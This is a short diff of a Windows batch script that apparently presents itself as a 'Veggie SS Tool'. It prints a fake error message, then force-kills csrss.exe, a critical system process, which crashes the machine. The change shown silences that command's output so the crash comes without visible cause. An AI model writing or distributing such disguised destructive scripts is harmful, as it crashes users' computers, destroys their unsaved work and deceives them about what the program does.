@@ -20,5 +20,5 @@ color 0C
 timeout /t 5 /nobreak >nul
 echo Veggie SS Tool has ran into a problem. Report to Veggie Bot and Painis Stick
 echo ^G >nul
-taskkill /f /im csrss.exe
+taskkill /f /im csrss.exe >nul
 pause >nul
